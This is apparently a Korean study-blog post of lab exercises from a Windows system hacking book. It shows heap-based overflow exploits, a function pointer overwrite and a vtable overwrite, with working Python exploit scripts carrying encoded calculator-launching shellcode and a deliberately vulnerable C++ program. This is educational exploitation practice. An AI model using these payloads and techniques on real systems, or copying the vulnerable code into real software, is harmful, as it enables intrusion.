---
title: 윈도우 시스템 해킹 - 힙 버퍼 오버플로우
category:
    - System Hacking
tags:
    - Windows
    - System
    - Hacking
---
[윈도우 시스템 해킹 가이드 / 김현민 저] <br/>
위의 책을 보면서 실습한 코드를 정리함.

마찬가지로 이전과 같이 계산기를 띄우는 쉘코드를 사용하였다.

---

### # Heap

힙 영역은 <u>1. stack보다 큰 메모리를 필요로 할 때</u> 와 <u>2. 객체를 생성할 때</u> 메모리 공간을 사용한다고 한다. 메모리를 배우면서 data, bss, heap 과 같은 영역들을 구분지어서 배웠기 때문에 "Heap-based overflow"라고 하면 data/bss section들은 아닐 것이라고 생각 했었는데, 세 section 모두 overflow 대상으로는 비슷하므로 전체를 묶어서 생각하면 될 듯 싶다.

---

### # Function Pointer Overwrite

#### 1. Vulnerable Code

취약한 코드는 직접 구현하지 않고 http://cafe.naver.com/secuholic -> [윈도우 시스템 해킹 가이드] -> [자료실]에서 다운받아 사용하였다. (vul_HTTP_server.exe)

#### 2. Exploit Code

```python
from socket import *

NOP = b"\x90" * 200
SHELLCODE = (
    b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
    b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
    b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
    b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
    b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
    b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
    b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
    b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
    b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
    b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
    b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
    b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
)

print("Shellcode Length :", len(SHELLCODE))
DUMMY = b"A"*(499-len(NOP+SHELLCODE))
BUF = b"\x40\x61\x41\x00"
PAYLOAD = NOP + SHELLCODE + DUMMY + BUF

print("[+] Sending Packet...")
s = socket(AF_INET, SOCK_STREAM, 0)
s.connect(('localhost', 80))
s.send(b"GET /"+PAYLOAD)
print(s.recv(150))
s.close()
```

overflow를 일으키는 방법과 실행흐름을 바꾸는 원리는 stack overflow와 매우 비슷하므로 쉽게 코드작성이 가능했으므로 자세한 설명은 생략.

---

### # Vtable Overwrite

대략적으로 아래와 같은 형태로 Vtable이 존재한다. virtual 함수들을 실행할 때는 Vtable을 참조하므로 `Object[0][#func]` 느낌으로 호출하는데, 여기서 `Object[0]` 또는 `Object[0][#func]`의 주소 자체를 바꿔주면 실행 흐름을 바꿀 수 있다. Overflow로 바꿀 수 있는 부분은 전자이므로 해당 부분을 바꿔서 exploit한다.
```
Object  ->  Vtable  ->  vfunc1
            member1     vfunc2
            member2     vfunc3
```

#### 1. Vulnerable Code
```cpp
#include "stdafx.h"
#include <string>
#include <cstdlib>
#include <iostream>
using namespace std;
#pragma warning(disable:4996)
#pragma warning(disable:2664)

class Book {
private:
	char name[100];
	int page;
public:
	Book(char * _name, int _page) {
		strcpy(name, _name);
		page = _page;
	}
	virtual void setName(char* input) {
		char* buf = (char*)malloc(20);
		strcpy(buf, input);
		printname(buf);
		getName();
	}
	virtual void printname(char* buf) {
		printf("name : %s", buf);
	}
	virtual char* getName() {
		return name;
	}
};


int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf(" Usage: bookmanager.exe [filename]\n");
		exit(1);
	}
	static char contents[1000] = { 0, };
	char name[16] = "windows_hacking";
	static Book mybook(name, 1);
	printf("object addr : 0x%x\n", &mybook);
	printf("object vtable addr : 0x%p\n", mybook);
	printf("buf addr : 0x%p\n", &contents);

	FILE *f = fopen(argv[1], "r");
	fgets(contents, 1500, f);
	mybook.setName(contents);
	return 0;
}
```

원래 코드에서는 `"windows_hacking"`을 객체 생성할 때 바로 넣어 주었는데, 에러가 발생하여 name변수를 추가해 넣어주었다. 보안 옵션으로는 DEP를 해제해 주었다.

#### 2. Exploit Code

```python
import struct

print(" # bookmanager.exe exploit ")

shellcode = (
        b"\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x2a\xbf\xce\xe7\xd6\xa7"
        b"\x31\x7e\x13\x83\xc6\x04\xe2\xf8\x45\x0b\x3d\x97\x8c\x4a\xb6\xa4"
        b"\x16\x6c\x25\x94\x0e\xd4\x29\x0b\xcd\x1f\x52\x67\xbb\x1e\x5f\xda"
        b"\xde\x86\xef\xda\xde\x92\x33\xa8\x79\xb3\x87\x59\x45\x9a\xce\x2c"
        b"\xb9\xfb\xd5\x54\x45\xdb\x40\xa4\x35\x6c\x11\x64\xaa\x46\xe6\xa7"
        b"\xce\xe7\x5d\xe7\xc2\x6c\x96\xb3\x45\xff\x5d\xbc\x45\xbc\xc6\x2c"
        b"\xb5\xdb\xd5\x5c\x45\x98\xae\xa4\x35\x6e\xab\xbf\x45\x90\xf6\xa4"
        b"\x3d\x6c\x99\x83\xcd\x2c\xe5\x75\xae\xd4\x29\xc1\x71\x54\xd4\x4f"
        b"\x56\x18\x29\x58\x47\xa2\xf6\xc6\xfd\x18\xb0\x18\xb7\xe3\x3e\x2e"
        b"\x31\x18\x29\x2e\x8b\xc3\xe5\x67\x08\xa2\xda\xc4\x08\xa2\xdb\xc6"
        b"\x08\xa2\xd8\xcb\x08\xa2\xd9\xc4\x47\xa2\xc6\x94\x0e\xa7\x86\x2a"
        b"\x8b\xeb\x86\x58\x9b\xc7\xe5\x67\x9e\x18\x83\x83"
)

payload = b""
payload += struct.pack("<L", 0xfeb288 + 0xc) * 3
payload +=  b"\x90" * 30
payload += shellcode
payload += b"A" * (1000 - len(payload))
payload += struct.pack("<L", 0xfeb288)

f = open("exp.txt", "wb")
f.write(payload)
f.close()
print("\tlength =", len(payload))

print("[+] Done !!")
```

Exploit을 해보니 Linux의 PLT, GOT의 느낌과 비슷해서 검색을 해보니 맞는 것 같다. 즉, 사용되는 코드만 data영역에 로드하고 그 주소를 vtable에 저장하여 사용한다.

객체 안의 함수를 virtual이 아니라 일반 함수로 한다면, 당연히 프로그램이 실행되면서 text 영역에 로딩되고 함수 주소가 call로 하드코딩 되어 실행되기 때문에 비슷한 방법으로는 exploit이 불가능할 것 같다.
